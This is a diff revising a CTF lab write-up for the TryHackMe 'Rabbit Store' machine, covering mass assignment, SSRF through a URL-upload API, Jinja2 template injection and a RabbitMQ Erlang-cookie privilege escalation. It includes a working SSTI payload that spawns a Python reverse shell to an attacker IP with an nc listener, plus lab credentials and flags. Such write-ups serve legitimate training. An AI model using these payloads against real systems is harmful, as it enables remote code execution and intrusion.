@@ -42,7 +42,7 @@ Navigating to cloudsite.thm we are greeted with a landing page which has a login
 
 There is a sign-up button; let's register an account, login and see what we can find. We are presented with a dashboard after logging in.
 
-Using Burp to intercept the request, we see a JWT token is assigned after login. Using JWT Editor, we decoded the token:
+Using Burp to intercept the request, we see a JWT token is assigned after login. Using JWT Editor, we decoded the token to be:
 
 ```json
 {
@@ -53,7 +53,7 @@ Using Burp to intercept the request, we see a JWT token is assigned after login.
 }
 ```
 
-Attempts to exploit the token via `alg:none` or algorithm confusion failed. Eventually, mass assignment succeeded by adding `"subscription": "active"` during registration:
+Attempts to exploit the token via `alg:none` & algorithm confusion failed. Eventually i pivoted to mass assignment which simply involed adding the `"subscription":"inactive"` parameter in the request header during registration and simply modifying it to `"subscription":"active"`.
 
 ```json
 {
@@ -64,29 +64,32 @@ Attempts to exploit the token via `alg:none` or algorithm confusion failed. Even
 }
 ```
 
-This elevated us to a premium user.
+This gave usthe privilege we needed to access the dashboard.
 
 ---
 
-## SSTI Discovery via Upload Feature
+## SSRF Discovery via Upload Feature
+Loking at the dashboard, we see 2 upload functions. One for uploading files from local machine and the other from a URL. Seeing this, my first thought was there may be some kind of File upload vulnerability i can exploit, so that is what i focused on.
 
-While exploring the premium dashboard, we found a URL upload feature at `/api/store-url` and a file upload at `/api/upload`.
+The next step was to simply try and upload a file via both methods and intercept the request. On our machine we set a host using python `python3 -m http.server 9000`
+and simply inserted `http://10.8.137.194:9000/test.txt` and we receive a request being made to our server. Refreshing the page shows a file and clicking it downloads the file, and sure enough, it was our file.
+
+While looking at the request body via burp, we find that both upload fuctions make requests to 2 different api endpoints. The URL upload feature make a request to `/api/store-url` and the file upload to `/api/upload/`. and finally to view any file, it makes a request to `api/upload/Filename` (The filename will is hashed)
 
 ### API Enumeration via FFUF
-
-We fuzzed with `ffuf` and discovered a hidden endpoint `/api/docs`:
+Since we are dealing with an Api, we can try fuzzing to see if we can find any hidden endpoint. Using `ffuf`, we discovered a hidden endpoint `/api/docs`:
 
 ```bash
 ffuf -u https://storage.cloudsite.thm/api/FUZZ -w api-endpoints.txt
 ```
 
-Direct access was denied (`403`). However, abusing the `store-url` upload feature:
+Direct access was denied (`403`). By simply navigating to the endpoint via browser we get a message saying it can only be accessed by Localhost at port 8000. Since we have confirmed SSRF can try and manipulate the server to do just that by abusing the `api/store-url` upload feature by adding the below JSON to the request body:
 
 ```json
 { "url": "http://127.0.0.1/api/docs" }
 ```
 
-Downloaded a JSON file with all API endpoints.
+This worked & i was able to gain access to the `api/docs` file and download it which revealed all the api endpoints.
 
 ### Dumped API Endpoints
 
@@ -108,23 +111,29 @@ GET:
 
 ## Discovering and Exploiting SSTI
 
-One endpoint `/api/fetch_messeges_from_chatbot` stood out. Sending a POST without a body returned:
+One endpoint `/api/fetch_messeges_from_chatbot` stood out. Sending a POST request without a body returned:
 
 ```json
 {"error": "username parameter is required"}
 ```
 
-Using this:
+so i added this to the request body:
 
 ```json
-{ "username": "${{<%[%'\"}}%\\." }
+{ "username": "" }
 ```
 
-...revealed a **Jinja2 error**, confirming SSTI.
+Then testing for SSTI, i used the following payload:
+
+```json
+{ "username": "${{<%[%'"}}%\." }
+```
+
+This revealed a **Jinja2 error**, confirming SSTI.
 
 ### Exploiting Jinja2 for RCE
 
-```jinja2
+```Python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.8.137.194\",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}
 ```
 listener: ```nc -lvnp 9001```
@@ -134,22 +143,20 @@ We caught a reverse shell as user `azreal`.
 ```bash
 cd /home
 cat user.txt
+98d3a30f{Redacted}44d317be0c47e
 ```
 
 ---
 
 ## Privilege Escalation via RabbitMQ
 
-RabbitMQ was running on ports 4369 and 25672.
-
-We found the Erlang cookie:
+Performing enumeration on the target machine, we find a curious directory `/var/lib/rabbitmq`. Navigating to the directory `cd /var/lib/rabbitmq`, lets list the contents of the directory using `ls -la` we see a .erlang.cookie file. lets read it
 
 ```bash
 cat /var/lib/rabbitmq/.erlang.cookie
 # XrMEGa8a2jG63bGn
 ```
-
-Using `epmd -names`:
+Since we know rabbit is running on the system, lets enumerate the process name Using `epmd -names`:
 
 ```
 name rabbit at port 25672
@@ -160,13 +167,13 @@ Added the hostname to `/etc/hosts`:
 ```
 10.10.240.29 forge
 ```
+On our local machine we can confirm if the node is active & see if we can connect.
 
-Confirmed the node:
+Confirmed the node using:
 
 ```bash
 rabbitmqctl --node rabbit@forge --erlang-cookie XrMEGa8a2jG63bGn status
 ```
-
 ### Enumerating Users
 
 ```bash
@@ -201,29 +208,28 @@ echo 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF | base64 -d | xxd -p -c 10
 ```
 
 Result:
-
+SHA26 hash & salt
 ```
 e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
 ```
+**Before we can use the above to gain root we have to remove the 4byte salt at the which is `e3d7ba85` then the final result will be**
 
 Password hash:
-
+SHA 256 hash
 ```
 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
 ```
-
+Then lets accesss root using su -
 ```bash
 su -
 # password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
 ```
-
-🏁 **Root flag**:
+**Root flag**:
+```
+cat root.txt
+eabf7a0{Redacted}f3e0465d2fd0852
 
 ```
-eabf7a0b05d3f2028f3e0465d2fd0852
-```
-
----
 
 ## Key Takeaways
 
@@ -233,7 +239,5 @@ eabf7a0b05d3f2028f3e0465d2fd0852
 - RabbitMQ nodes can expose secrets via exported definitions
 - The `.erlang.cookie` is sensitive and grants node-level access
 
----
-
 **Inspired by:** [jaxafed's Rabbit Store write-up](https://jaxafed.github.io/posts/tryhackme-rabbit_store/)  
-**Written by:** David Umoh (Cybersecurity Student & Pentester)
+**Written by:** David Umoh (Cybersecurity enthusiat & Pentester)
